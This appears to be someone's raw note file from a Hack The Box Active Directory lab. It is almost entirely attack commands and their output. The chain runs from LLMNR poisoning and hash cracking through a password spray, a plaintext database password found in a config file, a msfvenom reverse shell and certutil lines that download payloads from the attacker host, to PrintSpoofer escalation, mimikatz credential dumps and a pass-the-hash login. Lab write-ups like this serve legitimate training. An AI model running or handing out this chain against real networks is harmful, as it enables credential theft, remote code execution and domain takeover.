```
sudo responder -I ens224 -v                                                               
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.7.240]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LE1DKAH0OX3]
    Responder Domain Name      [NHD1.LOCAL]
    Responder DCE-RPC Port     [45495]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...                                                                     

[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:9aa5354a317fdb09:3C407BD8C752D3C0CCBFE752460554E1:0101000000000000005729E4772BDD01E9E874797D7989DE00000000020008004E0048004400310001001E00570049004E002D004C004500310044004B004100480030004F005800330004003400570049004E002D004C004500310044004B004100480030004F00580033002E004E004800440031002E004C004F00430041004C00030014004E004800440031002E004C004F00430041004C00050014004E004800440031002E004C004F00430041004C0007000800005729E4772BDD0106000400020000000800300030000000000000000000000000200000CFEF749BB7B2228A2FDFDBCF39E8B8D0749DB11C8951DD92E388B9C56CFE48730A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000     
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT

```

```
hashcat -m 5600 AB920 /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2343 MB free)

Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

AB920::INLANEFREIGHT:9aa5354a317fdb09:3c407bd8c752d3c0ccbfe752460554e1:0101000000000000005729e4772bdd01e9e874797d7989de00000000020008004e0048004400310001001e00570049004e002d004c004500310044004b004100480030004f005800330004003400570049004e002d004c004500310044004b004100480030004f00580033002e004e004800440031002e004c004f00430041004c00030014004e004800440031002e004c004f00430041004c00050014004e004800440031002e004c004f00430041004c0007000800005729e4772bdd0106000400020000000800300030000000000000000000000000200000cfef749bb7b2228a2fdfdbcf39e8b8d0749db11c8951dd92e388b9c56cfe48730a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:9aa5354a317fdb09:3c407bd8c752d...000000
Time.Started.....: Fri Aug 14 08:38:42 2026 (0 secs)
Time.Estimated...: Fri Aug 14 08:38:42 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   829.2 kH/s (1.94ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 290816/14344384 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 286720/14344384 (2.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 10032004 -> temporada
Hardware.Mon.#01.: Util: 41%

Started: Fri Aug 14 08:38:41 2026
Stopped: Fri Aug 14 08:38:43 2026

```

```
[Agent : htb-student@skills-par01] » 
[Agent : htb-student@skills-par01] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌──────────────────────────────────────────────────┐
│ Interface 1                                      │
├──────────────┬───────────────────────────────────┤
│ Name         │ ens192                            │
│ Hardware MAC │ a2:de:ad:e2:63:47                 │
│ MTU          │ 1500                              │
│ Flags        │ up|broadcast|multicast|running    │
│ IPv4 Address │ 10.129.108.106/16                 │
│ IPv6 Address │ dead:beef::5180:4163:5f19:ee89/64 │
│ IPv6 Address │ fe80::3cdf:1c1f:308:88bf/64       │
└──────────────┴───────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ a2:de:ad:de:d8:fb              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.7.240/23                │
│ IPv6 Address │ fe80::2957:2d31:5225:229a/64   │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────┐
│ Interface 3                           │
├──────────────┬────────────────────────┤
│ Name         │ docker0                │
│ Hardware MAC │ 02:42:18:aa:d6:56      │
│ MTU          │ 1500                   │
│ Flags        │ up|broadcast|multicast │
│ IPv4 Address │ 172.17.0.1/16          │

```

```
ip route show | grep 172.16.6.0
172.16.6.0/24 dev ligolo scope link 
172.16.6.0/23 dev ligolo scope link 
                                                                                                
┌──(satoru㉿satoru)-[~/Downloads]
└─$ sudo ip route del 172.16.6.0/24 dev ligolo
                                                                                                
┌──(satoru㉿satoru)-[~/Downloads]
└─$ ip route show | grep 172.16.6.0           
172.16.6.0/23 dev ligolo scope link 

```

![](Attachments/Pasted%20image%2020260814091731.png)

```
┌─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec smb 172.16.7.3 -u 'AB920' -p 'weasal' -d INLANEFREIGHT.LOCAL --users | tee users.txt
SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 
SMB         172.16.7.3      445    DC01             [+] Enumerated domain user(s)
SMB         172.16.7.3      445    DC01             INLANEFREIGHT.LOCAL\Administrator                  badpwdcount: 0 baddpwdtime: 2022-04-11 23:12:32.366484                                   
SMB         172.16.7.3      445    DC01             INLANEFREIGHT.LOCAL\Guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58                                
```

```
└──╼ $cat users.txt | wc -l                                                                     
2904

```

First bruteforce using kerbrute.

and i did passwordpsray to confirm
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 cleanlist.txt  'Welcome1'   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 08/14/26 - Ronnie Flathers @ropnop

2026/08/14 02:42:03 >  Using KDC(s):
2026/08/14 02:42:03 >   172.16.7.3:88

2026/08/14 02:42:18 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
2026/08/14 02:42:18 >  Done! Tested 2901 logins (1 successes) in 15.009 seconds

```

```
smbclient "//172.16.7.3/Department Shares" -U 'INLANEFREIGHT.LOCAL\BR086%Welcome1'        
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr  1 11:04:01 2022
  ..                                  D        0  Fri Apr  1 11:04:01 2022
  Accounting                          D        0  Fri Apr  1 11:04:03 2022
  Executives                          D        0  Fri Apr  1 11:03:58 2022
  Finance                             D        0  Fri Apr  1 11:03:54 2022
  HR                                  D        0  Fri Apr  1 11:03:43 2022
  IT                                  D        0  Fri Apr  1 11:03:39 2022
  Marketing                           D        0  Fri Apr  1 11:03:50 2022
  R&D                                 D        0  Fri Apr  1 11:03:46 2022

                10328063 blocks of size 4096. 8131464 blocks available
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Fri Apr  1 11:03:39 2022
  ..                                  D        0  Fri Apr  1 11:03:39 2022
  Private                             D        0  Fri Apr  1 11:03:39 2
```

```
      <trust level="Full"/>
       <pages validateRequest="true"/>
       <globalization uiCulture="auto:en-US" />
           <masterDataServices>  
            <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
       </masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>

```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
```
```
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"
```

```
 Directory of C:\Users\Public                                                      

NULL                                                                               

08/14/2026  09:07 AM    <DIR>          .                                           

08/14/2026  09:07 AM    <DIR>          ..                                          

10/06/2021  03:38 PM    <DIR>          Documents                                   

09/15/2018  02:19 AM    <DIR>          Downloads                                   

09/15/2018  02:19 AM    <DIR>          Music                                       

09/15/2018  02:19 AM    <DIR>          Pictures                                    

08/14/2026  09:07 AM            27,136 PrintSpoofer64.exe                          

08/14/2026  09:06 AM             7,168 shell.exe                                   

09/15/2018  02:19 AM    <DIR>          Videos                                      

               2 File(s)         34,304 bytes                                      

               7 Dir(s)  17,227,800,576 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"

```

```
SQL> xp_cmdshell C:\Users\Public\PrintSpoofer64.exe -c C:\Users\Public\shell.exe
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                                                                               

SQL> 

```


```
C:\Windows\system32>more C:\Users\administrator\Desktop\flag.txt
more C:\Users\administrator\Desktop\flag.txt

```

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/


meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
meterpreter > 

```

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
Local SID : S-1-5-21-3827174835-953655006-33323432

SAMKey : 1f3713f605ea38af43344dc944dea5ce

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 136b3ddfbb62cb02e53a8f661248f364

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 81758876d60e11231820a371178e3530

* Primary:Kerberos-Newer-Keys *
    Default Salt : SQL01.INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ebac626a2675b1b19821f89b42bf783f458b11578aa6d94a7d9d3baebdcf0b6e
      aes128_hmac       (4096) : c4006bb6f49cd841aa764621e0fbbf5d
      des_cbc_md5       (4096) : 45b0c16d26cd29e5
    OldCredentials
      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
      des_cbc_md5       (4096) : ef9898bf10c754b5
    OlderCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : SQL01.INLANEFREIGHT.LOCALAdministrator
    Credentials
      des_cbc_md5       : 45b0c16d26cd29e5
    OldCredentials
      des_cbc_md5       : ef9898bf10c754b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5



meterpreter > 

```
```
 $evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99            

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                         

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms01\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt

```

